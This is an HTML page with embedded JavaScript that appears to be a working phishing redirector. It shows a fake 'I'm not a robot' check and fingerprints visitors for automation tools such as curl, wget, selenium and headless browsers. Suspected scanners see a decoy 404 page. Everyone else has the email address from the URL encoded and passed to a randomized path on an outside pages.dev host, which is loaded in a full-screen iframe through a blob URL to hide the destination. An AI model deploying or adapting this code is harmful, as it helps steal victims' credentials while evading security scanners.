<!DOCTYPE html>
<html>
<head>
    <title>Blob IPFS Redirect + Friendly Anti-Bot</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    /* FULLSCREEN OVERLAY */
    #overlay {
        position: fixed;
        inset: 0;
        background: #00875A;
        display: flex;
        justify-content: center;
        align-items: center;
        opacity: 1;
        z-index: 999999;
    }

    /* VERIFICATION BOX */
    #verificationBox {
        background: #fff;
        padding: 16px 20px;
        border-radius: 16px;
        width: 220px;
        box-shadow: 0 4px 14px rgba(0,0,0,0.14);
        border: 1px solid #dcdcdc;
    }

    .verify-row {
        display: flex;
        align-items: center;
        gap: 10px;
    }

    #robotIcon {
        width: 26px;
        height: 26px;
        border-radius: 50%;
        background: #e8f0fe;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 14px;
    }

    #checkbox {
        width: 22px;
        height: 22px;
        border-radius: 5px;
        border: 2px solid #7f8fa6;
        background: #fff;
        cursor: pointer;
        position: relative;
        transition: 0.2s;
    }

    #checkbox.active {
        background: #34a853;
        border-color: #34a853;
        box-shadow: 0 0 6px rgba(52,168,83,0.6);
    }

    #checkbox.active::after {
        content: "";
        position: absolute;
        left: 6px;
        top: 3px;
        width: 5px;
        height: 10px;
        border: 2px solid white;
        border-left: none;
        border-top: none;
        transform: rotate(45deg);
    }

    #verifying {
        display: none;
        margin-top: 10px;
        font-size: 12px;
        text-align: center;
        color: #555;
    }

    .spinner {
        width: 12px;
        height: 12px;
        border-radius: 50%;
        border: 2px solid #40739e;
        border-top-color: transparent;
        animation: spin .6s linear infinite;
    }

    @keyframes spin {
        from { transform: rotate(0); }
        to { transform: rotate(360deg); }
    }
    </style>
</head>
<body>

<div id="overlay">
    <div id="verificationBox">
        <div class="verify-row">
            <div id="robotIcon">ðŸ¤–</div>
            <strong>I'm not a robot</strong>
            <div id="checkbox"></div>
        </div>
        <div id="verifying">
            <div class="verify-loading">
                <div class="spinner"></div> Verifyingâ€¦
            </div>
        </div>
    </div>
</div>

<script>
/* ===================== FRIENDLY BOT DETECTION ===================== */
async function friendlyBotCheck() {
    let score = 0;
    const ua = navigator.userAgent.toLowerCase();
    const bots = ["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
    if (bots.some(b => ua.includes(b))) score += 30;
    if (navigator.webdriver) score += 30;

    try { 
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!ctx) score += 10;
    } catch { score += 10; }

    try { 
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        if (ctx.sampleRate < 30000) score += 5;
    } catch { score += 5; }

    if (screen.width < 500 || screen.height < 400) score += 5;

    let movements = [];
    window.addEventListener("mousemove", e => { movements.push({x:e.clientX, y:e.clientY}); });

    await new Promise(r => setTimeout(r, 1000));
    if (movements.length < 3) score += 10;

    return score >= 60;
}

/* ===================== RANDOMIZED REDIRECT LOGIC ===================== */
const BASE_DOMAIN = "https://23b538b5.ko1wx90sd.pages.dev";

// Multiple sub-folders
const SUBFOLDERS = ["sub1", "sub2", "sub3", "sub4", "sub5"];

// Simple URL-safe base64 encode
function base64Encode(str) {
    return btoa(unescape(encodeURIComponent(str))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
}

// Build randomized per-visit URL
function buildRandomURL(email="") {
    const folder = SUBFOLDERS[Math.floor(Math.random() * SUBFOLDERS.length)];
    const timestamp = Date.now();
    const payload = {email, ts: timestamp};
    const encoded = base64Encode(JSON.stringify(payload));

    // Final URL: https://domain/folder/?data=<encoded>
    return `${BASE_DOMAIN}/${folder}/?data=${encoded}`;
}

function createBlobHTML(url) {
    return `
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
        html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
        iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
        </style>
    </head>
    <body>
        <iframe src="${url}"></iframe>
    </body>
    </html>`;
}

/* ===================== VERIFICATION ===================== */
function requireVerification() {
    return new Promise(resolve => {
        const overlay = document.getElementById("overlay");
        const checkbox = document.getElementById("checkbox");
        const verifying = document.getElementById("verifying");

        checkbox.onclick = () => {
            checkbox.classList.add("active");
            verifying.style.display = "block";

            setTimeout(() => {
                overlay.style.opacity = 0;
                setTimeout(() => overlay.remove(), 300);
                resolve(true);
            }, 700);
        };
    });
}

/* ===================== 404 PAGE ===================== */
function show404() {
    document.body.innerHTML = `
    <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; background:#f8f8f8; text-align:center;">
        <h1 style="font-size:90px; margin:0;">404</h1>
        <h2 style="font-size:26px; margin:0;">Error</h2>
        <p style="font-size:18px;">The requested page could not be found.</p>
    </div>`;
}

/* ===================== MAIN FLOW ===================== */
document.addEventListener("DOMContentLoaded", async () => {
    await requireVerification();

    if (await friendlyBotCheck()) { show404(); return; }

    const email = new URLSearchParams(location.search).get("email") || "";
    const url = buildRandomURL(email);

    const blobHTML = createBlobHTML(url);
    const blob = new Blob([blobHTML], { type:"text/html" });
    const blobURL = URL.createObjectURL(blob);

    window.location.href = blobURL;
});
</script>

</body>
</html>
